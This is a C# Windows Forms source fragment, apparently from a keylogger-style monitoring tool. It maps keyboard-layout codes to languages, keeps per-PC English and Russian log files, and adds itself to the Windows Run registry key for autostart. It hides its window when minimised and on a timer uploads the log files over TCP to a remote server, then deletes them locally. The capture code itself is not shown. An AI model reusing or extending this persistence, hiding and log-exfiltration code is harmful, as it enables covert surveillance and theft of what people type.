                return "German";
            case "00010407":
                return "German (ibm)";
            case "0000046F":
                return "Greenlandic";
            case "00000468":
                return "Hausa";
            case "0000040D":
                return "Hebrew";
            case "00010439":
                return "Hindi traditional";
            case "00000408":
                return "Greek";
            case "00010408":
                return "Greek (220)";
            case "00030408":
                return "Greek (220) latin";
            case "00020408":
                return "Greek (319)";
            case "00040408":
                return "Greek (319) latin";
            case "00050408":
                return "Greek latin";
            case "00060408":
                return "Greek polyonic";
            case "00000447":
                return "Gujarati";
            case "0000040E":
                return "Hungarian";
            case "0001040E":
                return "Hungarian 101 key";
            case "0000040F":
                return "Icelandic";
            case "00000470":
                return "Igbo";
            case "0000085D":
                return "Inuktitut - latin";
            case "0001045D":
                return "Inuktitut - naqittaut";
            case "00001809":
                return "Irish";
            case "00000410":
                return "Italian";
            case "00010410":
                return "Italian (142)";
            case "00000411":
                return "Japanese";
            case "0000044B":
                return "Kannada";
            case "0000043F":
                return "Kazakh";
            case "00000453":
                return "Khmer";
            case "00000412":
                return "Korean";
            case "00000440":
                return "Kyrgyz cyrillic";
            case "00000454":
                return "Lao";
            case "0000080A":
                return "Latin america";
            case "00000426":
                return "Latvian";
            case "00010426":
                return "Latvian (qwerty)";
            case "00010427":
                return "Lithuanian";
            case "00000427":
                return "Lithuanian ibm";
            case "00020427":
                return "Lithuanian standard";
            case "0000046E":
                return "Luxembourgish";
            case "0000042F":
                return "Macedonian (fyrom)";
            case "0001042F":
                return "Macedonian (fyrom) - standard";
            case "0000044C":
                return "Malayalam";
            case "0000043A":
                return "Maltese 47-key";
            case "0001043A":
                return "Maltese 48-key";
            case "0000044E":
                return "Marathi";
            case "00000481":
                return "Maroi";
            case "00000450":
                return "Mongolian cyrillic";
            case "00000850":
                return "Mongolian (mongolian script)";
            case "00000461":
                return "Nepali";
            case "00000414":
                return "Norwegian";
            case "0000043B":
                return "Norwegian with sami";
            case "00000448":
                return "Oriya";
            case "00000463":
                return "Pashto (afghanistan)";
            case "00000429":
                return "Persian";
            case "00000415":
                return "Polish (programmers)";
            case "00010415":
                return "Polish (214)";
            case "00000816":
                return "Portuguese";
            case "00000416":
                return "Portuguese (brazillian abnt)";
            case "00010416":
                return "Portuguese (brazillian abnt2)";
            case "00000446":
                return "Punjabi";
            case "00010418":
                return "Romanian (standard)";
            case "00000418":
                return "Romanian (legacy)";
            case "00020418":
                return "Romanian (programmers)";
            case "00000419":
                return "Russian";
            case "00010419":
                return "Russian (typewriter)";
            case "0002083B":
                return "Sami extended finland-sweden";
            case "0001043B":
                return "Sami extended norway";
            case "00000C1A":
                return "Serbian (cyrillic)";
            case "0000081A":
                return "Serbian (latin)";
            case "0000046C":
                return "Sesotho sa Leboa";
            case "00000432":
                return "Setswana";
            case "0000045B":
                return "Sinhala";
            case "0001045B":
                return "Sinhala -Wij 9";
            case "0000041B":
                return "Slovak";
            case "0001041B":
                return "Slovak (qwerty)";
            case "00000424":
                return "Slovenian";
            case "0001042E":
                return "Sorbian extended";
            case "0002042E":
                return "Sorbian standard";
            case "0000042E":
                return "Sorbian standard (legacy)";
            case "0000040A":
                return "Spanish";
            case "0001040A":
                return "Spanish variation";
            case "0000041D":
                return "Swedish";
            case "0000083B":
                return "Swedish with sami";
            case "00000807":
                return "Swiss german";
            case "0000100C":
                return "Swiss french";
            case "0000045A":
                return "Syriac";
            case "0001045A":
                return "Syriac phonetic";
            case "00000428":
                return "Tajik";
            case "00000449":
                return "Tamil";
            case "00000444":
                return "Tatar";
            case "0000044A":
                return "Telugu";
            case "0000041E":
                return "Thai Kedmanee";
            case "0002041E":
                return "Thai Kedmanee (non-shiftlock)";
            case "0001041E":
                return "Thai Pattachote";
            case "0003041E":
                return "Thai Pattachote (non-shiftlock)";
            case "00000451":
                return "Tibetan (prc)";
            case "0001041F":
                return "Turkish F";
            case "0000041F":
                return "Turkish Q";
            case "00000442":
                return "Turkmen";
            case "00000422":
                return "Ukrainian";
            case "00020422":
                return "Ukrainian (enhanced)";
            case "00000809":
                return "United Kingdom";
            case "00000452":
                return "United Kingdom Extended";
            case "00000409":
                return "United States";
            case "00010409":
                return "United States - dvorak";
            case "00030409":
                return "United States - dvorak left hand";
            case "00050409":
                return "United States - dvorak right hand";
            case "00004009":
                return "United States - india";
            case "00020409":
                return "United States - international";
            case "00000420":
                return "Urdu";
            case "00010480":
                return "Uyghur";
            case "00000480":
                return "Uyghur (legacy)";
            case "00000843":
                return "Uzbek cyrillic";
            case "0000042A":
                return "Vietnamese";
            case "00000485":
                return "Yakut";
            case "0000046A":
                return "Yoruba";
            case "00000488":
                return "Wolof";

            default:
                return "unknown";
        }
    }
        #region Dispetcher
        private void numericUpDown1_ValueChanged(object sender, EventArgs e)
        {
            tick = (int)numericUpDown1.Value;
        }

        private void Btn_Kill_Click(object sender, EventArgs e)
        {
            try
            {


                process.Kill();
                btn_Refresh_Click(sender, e);
                Btn_Kill.Enabled = false;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void btn_Refresh_Click(object sender, EventArgs e)
        {
            try
            {
                dgv_Proc.DataSource = Process.GetProcesses();
            }
            catch
            {

            }
        }

        private void Btn_Kill_Click_1(object sender, EventArgs e)
        {
            try
            {


                process.Kill();
                btn_Refresh_Click(sender, e);
                Btn_Kill.Enabled = false;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void btn_Refresh_Click_1(object sender, EventArgs e)
        {
            try
            {
                dgv_Proc.DataSource = Process.GetProcesses();
            }
            catch
            {

            }
        }

        private void dgv_Proc_SelectionChanged(object sender, EventArgs e)
        {
            //BasePriority HandleCount Id
            if (dgv_Proc.SelectedRows.Count == 0)
            {
                return;
            }
            Btn_Kill.Enabled = true;


            process = dgv_Proc.SelectedRows[0].DataBoundItem as Process;
            int count = 1;

            //var it = dgv_Proc.DataSource;

            //foreach (var item in dgv_Proc.DataSource)
            //{
            //    if (item.ToString().Equals(process.ProcessName))
            //    {
            //        count++;
            //    }

            //}


            MessageBox.Show($"Id: {process.Id}\nStart Time: {process.StartTime}\nCol-vo time: {process.TotalProcessorTime}\nCount potokov: {process.Threads.Count}\nCol-vo: {count}");
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            tack++;
            if (tack >= tick)
            {
                tack = 0;

                btn_Refresh_Click(sender, e);
            }
        }

        private void numericUpDown1_ValueChanged_1(object sender, EventArgs e)
        {
            tick = (int)numericUpDown1.Value;
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                timer1.Start();
            }
            else
            {
                timer1.Stop();
                tack = 0;
            }
        }

        #endregion

        private void btn_load_Click(object sender, EventArgs e)
        {



            if(dlgOpen.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            if(load_from != null)
            {
                load_from.Abort();
            }

            load_from = new Thread(Load_Files_From);
            load_from.Start(new ArrayList { lb_Info_Eng, lb_Info_Rus, dlgOpen.FileName });
        }

        private void btn_Save_Click(object sender, EventArgs e)
        {
            save = new Thread(SaveFile);
            save.Start(new ArrayList { lb_Info_Eng, lb_Info_Rus });
        }

        private void Btn_Clear_Click(object sender, EventArgs e)
        {
            lb_Info_Eng.Items.Clear();
            lb_Info_Rus.Items.Clear();
            lb_info_One_Str.Items.Insert(0, "Cleared current logs");
        }

        private void Load_Files_From(object obc)
        {
            mutex.WaitOne();
            ArrayList arrl = obc as ArrayList;
            ListBox listeng = arrl[0] as ListBox;
            ListBox listrus = arrl[1] as ListBox;
            string name_file = arrl[2] as string;

            StreamReader str = new StreamReader(name_file, Encoding.Default);
            StreamReader str2 = new StreamReader(name_file, Encoding.Default);

            Action action;
        
            try
            {
                if (name_file.Contains("LogsEng"))
                {



                    //using (FileStream fstream = File.OpenRead(name_file))
                    //{

                    //    byte[] array = new byte[fstream.Length];

                    //    fstream.Read(array, 0, array.Length);

                    //    text = System.Text.Encoding.Default.GetString(array);

                    //}

                    
                    while (!str.EndOfStream)
                    {

                        string st = str.ReadLine();
                        action = () =>
                        {
                            lb_Info_Eng.Items.Insert(0, st);
                        };
                        if (InvokeRequired)
                        {

                            Invoke(action);
                        }
                        else
                        {
                            action();

                        }



                    }

                    

                    action = () =>
                    {

                    
                        lb_info_One_Str.Items.Insert(0, "Log Eng loaded");
                    };
                    if (InvokeRequired)
                    {

                        Invoke(action);
                    }
                    else
                    {
                        action();

                    }
                   
                }

                

                if (name_file.Contains("LogsRus"))
                {
                   
                    while (!str2.EndOfStream)
                    {

                        string st2 = str2.ReadLine();
                        action = () =>
                        {
                            lb_Info_Rus.Items.Insert(0, st2);
                        };
                        if (InvokeRequired)
                        {

                            Invoke(action);
                        }
                        else
                        {
                            action();

                        }



                    }

                    
                    action = () =>
                    {
                        lb_info_One_Str.Items.Insert(0, "Log Rus loaded");
                    };
                    if (InvokeRequired)
                    {

                        Invoke(action);
                    }
                    else
                    {
                        action();

                    }
                   
                }

            }
            catch
            {
                
            }
            finally
            {
                try
                {
                    str.Close();
                    str2.Close();
                }
                catch { }
                
                mutex.ReleaseMutex();
            }

        }

        private void SaveEverySec_chb_CheckedChanged(object sender, EventArgs e)
        {
            if (SaveEverySec_chb.Checked)
            {
                Timer_Save.Start();
                Timer_Enable = true;
            }
            else
            {
                Timer_Save.Stop();
                tack_save = 0;
                Timer_Enable = false;
            }
        }

        private void numericUpDown2_ValueChanged(object sender, EventArgs e)
        {
            tick_save = (int)numericUpDown2.Value;
        }

        private void Timer_Save_Tick(object sender, EventArgs e)
        {

            tack_save++;
            if (tack_save >= tick_save)
            {
                
                tack_save = 0;
                Timer_Save.Stop();
               

                try
                {
                    if(!File.Exists($@"{path}\{pcName}_LogsEng.txt") || !File.Exists($@"{path}\{pcName}_LogsEng.txt"))
                    {
                        btn_Save_Click(sender, e);
                    }
                    else
                    {

                    
               
                FileInfo fn = new FileInfo(($@"{path}\{pcName}_LogsEng.txt"));
                    if (fn.Length > Count_of_kb && fn.Length < Count_of_kb + 500) // 102400
                    {
                        btn_Save_Click(sender, e);
                        if(client.Connect())
                        {
                            client.Connect();
                            Task.Run(SendToThe);
                            lb_info_One_Str.Items.Insert(0, "Sending files");

                        }
                        else
                        {
                            button1_Click_1(sender, e);
                        }

                        File.Delete(($@"{path}\{pcName}_LogsEng.txt"));
                        File.Delete(($@"{path}\{pcName}_LogsRus.txt"));
                        Btn_Clear_Click(null, null);
                        NewFile = true;
                        // Trunc
                    }
                    else
                    {
                        if (fn.Length > Count_of_kb + 500)
                        {
                            File.Delete(($@"{path}\{pcName}_LogsEng.txt"));
                            File.Delete(($@"{path}\{pcName}_LogsRus.txt"));
                            Btn_Clear_Click(null, null);
                            NewFile = true;
                        }
                        else
                        {

                            btn_Save_Click(sender, e);
                            if (client.Connect())
                            {
                                Task.Run(SendToThe);
                                lb_info_One_Str.Items.Insert(0, "Sending files");
                            }
                            else
                            {
                                client.Connect();
                                button1_Click_1(sender, e);
                            }
                            
                        }
                    }
                    }


                }
                catch(Exception)
                {

                }
                finally
                {
                    Timer_Save.Start();
                }

            }
        }

        private void rb_yes_CheckedChanged(object sender, EventArgs e)
        {
            RegistryKey lm = Registry.CurrentUser;
            try
            {
                
                RegistryKey run = lm.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", true);
                if(run.GetValue(Exe_Name) != null)
                {
                    return;
                }
                run.SetValue(Exe_Name, Exe_Path);
                run.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void rb_no_CheckedChanged(object sender, EventArgs e)
        {
            RegistryKey lm = Registry.CurrentUser;
            try
            {
                RegistryKey run = lm.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", true);
                if (run.GetValue(Exe_Name) == null)
                {
                    return;
                }
                run.DeleteValue(Exe_Name);
                run.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        #endregion

        private void Btn_send_To_Server_Click(object sender, EventArgs e)
        {
            Btn_send_To_Server.Enabled = false;
            Timer_send_in_minute.Start();
            //lb_server_logs.Items.Insert(0, "Connected");
            Task.Run(SendToThe);
        }

        private void SendToThe()
        {
            try
            {


                Action action = () =>
                {
                   

                    if (File.Exists($@"{path}\{pcName}_LogsEng.txt"))
                    {
                        FileInfo fn = new FileInfo(($@"{path}\{pcName}_LogsEng.txt"));
                        if (fn.Length >= 1)
                        {
                            lb_info_One_Str.Items.Insert(0, "");
                            if (NewFile == true)
                            {
                                client.Send($"File => True");
                            }
                            else
                            {
                                client.Send($"File => False");
                            }
                            string res = client.Read();
                            lb_server_logs.Items.Insert(0, res);

                            client.Send($"{pcName}_LogsEng.txt");
                            res = client.Read();
                            lb_server_logs.Items.Insert(0, res);

                            client.SendFile($@"{path}\{pcName}_LogsEng.txt");
                            res = client.Read();
                            lb_server_logs.Items.Insert(0, res);

                            lb_server_logs.Items.Insert(0, $"Sended {pcName}_LogsEng.txt");

                            res = client.Read();
                            lb_server_logs.Items.Insert(0, res);
                        }
                       
                    }

                    
                    //Thread.Sleep(100);

                    if (File.Exists($@"{path}\{pcName}_LogsRus.txt"))
                    {
                        FileInfo fn1 = new FileInfo(($@"{path}\{pcName}_LogsRus.txt"));
                        if (fn1.Length >= 1)
                        {
                            lb_info_One_Str.Items.Insert(0, "");
                            if (NewFile == true)
                            {
                                client.Send($"File => True");
                            }
                            else
                            {
                                client.Send($"File => False");
                            }
                            string res = client.Read();
                            lb_server_logs.Items.Insert(0, res);

                            client.Send($"{pcName}_LogsRus.txt");
                            res = client.Read();
                            lb_server_logs.Items.Insert(0, res);

                            client.SendFile($@"{path}\{pcName}_LogsRus.txt");
                            res = client.Read();
                            lb_server_logs.Items.Insert(0, res);

                            lb_server_logs.Items.Insert(0, $"Sended {pcName}_LogsRus.txt");

                            res = client.Read();
                            lb_server_logs.Items.Insert(0, res);
                        }
                    }

                    NewFile = false;
                };
                if (InvokeRequired)
                {

                    Invoke(action);
                }
                else
                {
                    action();

                }
            }
            catch(Exception ex)
            {


                Action action = () =>
                {
                    lb_server_logs.Items.Insert(0, $"{ex.Message}");
                };
                if (InvokeRequired)
                {

                    Invoke(action);
                }
                else
                {
                    action();

                }
            }
         

            
        }

        private void Btn_Connect_Click(object sender, EventArgs e)
        {
            if(string.IsNullOrWhiteSpace(txb_ip.Text))
            {
                return;
            }
            else
            {
                try
                {
                    lb_server_logs.Items.Insert(0, "User => Connecting");
                    client = new Tcp_Connect(txb_ip.Text, (int)nud_port.Value);
                }
                catch (Exception)
                {
                    lb_server_logs.Items.Insert(0, "User => Not Connected");
                }
                if (client.Connect())
                {
                    lb_server_logs.Items.Insert(0, "User => Connected");
                    Btn_Disconnect.Enabled = true;
                    Btn_send_To_Server.Enabled = true;
                    Btn_Connect.Enabled = false;
                }

            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            if (client != null)
            {
                client.Disconnect();
                Btn_Connect.Enabled = true;
                Btn_Disconnect.Enabled = false;
                Btn_send_To_Server.Enabled = false;
                lb_server_logs.Items.Insert(0, "User Disconnected");
               
            }
        }

        private void Timer_send_in_minute_Tick(object sender, EventArgs e)
        {
            tack_send++;
            if (tack_send % 10 == 0)
            {
                lb_server_logs.Items.Insert(0, $"Seconds ticked => {tack_send}");
            }
            if (tack_send >= tick_send)
            {
                tack_send = 0;
               
                //Timer_Save.Stop();
                //btn_Save_Click(sender, e);
                Btn_send_To_Server.Enabled = true;
                Timer_send_in_minute.Stop();
                // Btn_Clear_Click(sender, e);

                // 
            }
        }

        private void dlgOpen_FileOk(object sender, CancelEventArgs e)
        {

        }



        private void rb_order_name_CheckedChanged(object sender, EventArgs e)
        {
            if (rb_order_ascending.Checked)
            {
                dgv_Proc.Columns[dgv_Name].HeaderCell.SortGlyphDirection = SortOrder.Ascending;
            }
            else
            {
                dgv_Proc.Columns[dgv_Name].HeaderCell.SortGlyphDirection = SortOrder.Descending;
            }
            
        }

        private void rb_order_handle_CheckedChanged(object sender, EventArgs e)
        {
            if (rb_order_ascending.Checked)
            {
                dgv_Proc.Columns[dgv_Handle].HeaderCell.SortGlyphDirection = SortOrder.Ascending;
            }
            else
            {
                dgv_Proc.Columns[dgv_Handle].HeaderCell.SortGlyphDirection = SortOrder.Descending;
            }
        }

        private void rb_order_id_CheckedChanged(object sender, EventArgs e)
        {
            try
            {
            }
            catch
            {

            }
            if (rb_order_ascending.Checked)
            {
                dgv_Proc.Columns[dgv_Id].HeaderCell.SortGlyphDirection = SortOrder.Ascending;
            }
            else
            {
                dgv_Proc.Columns[dgv_Id].HeaderCell.SortGlyphDirection = SortOrder.Descending;
            }
        }

        private void rb_order_descending_CheckedChanged(object sender, EventArgs e)
        {
            dgv_Proc.Columns[dgv_Id].HeaderCell.SortGlyphDirection = SortOrder.Descending;
        }

        private void rb_order_ascending_CheckedChanged(object sender, EventArgs e)
        {
            dgv_Proc.Columns[dgv_Id].HeaderCell.SortGlyphDirection = SortOrder.Ascending;
        }

        private void Main_VisibleChanged(object sender, EventArgs e)
        {
           
        }

        private void Main_Deactivate(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Minimized)
            {
                IfWindowHidden = true;
                //this.WindowState = FormWindowState.Normal;
                ShowWindow(this.Handle, SW_HIDE);
            }   
        }

        private void nud_kbDel_ValueChanged(object sender, EventArgs e)
        {
            
        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }
    }
}
/*
 * Название автор

юмл

работа

 * */